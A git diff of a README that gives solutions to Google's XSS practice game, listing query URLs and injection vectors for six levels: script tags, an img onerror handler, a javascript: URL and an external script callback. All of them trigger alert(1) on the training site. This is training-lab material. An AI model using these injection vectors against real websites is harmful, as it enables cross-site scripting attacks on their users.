@@ -3,25 +3,25 @@ Below are the solutions to Google XSS challenges hosted on https://xss-game.apps
 
 ![alt text](https://github.com/akanshgulati/XSS-Challenges/raw/master/image1.png "Checklist")
  
-###Level 1: Hello, world of XSS
+### Level 1: Hello, world of XSS
 
-####Query
+#### Query
 `https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>`
 
-####Vector
+#### Vector
 `<script>alert(1)</script>`
  
-###Level 2: Persistence is key
+### Level 2: Persistence is key
  
-####Vector
+#### Vector
 `"><img src=x onerror=alert(1)>`
  
 ### Level 3: That sinking feeling...  
 
-####Query
+#### Query
 `https://xss-game.appspot.com/level3/frame#'/><script>alert(1)</script>`
 
-####Vector
+#### Vector
 `'/><script>alert(1)</script>`
  
 ### Level 4: Context matters 
@@ -31,14 +31,14 @@ Below are the solutions to Google XSS challenges hosted on https://xss-game.apps
 #### Vector 
 `1')%3Balert('1`
  
-####Level 5: Breaking protocol 
+#### Level 5: Breaking protocol 
  
-####Query 
+#### Query 
 `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)`
 #### Vector
 `javascript:alert(1)`
  
-###Follow the
+### Follow the
  
 #### Query
 `https://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert`
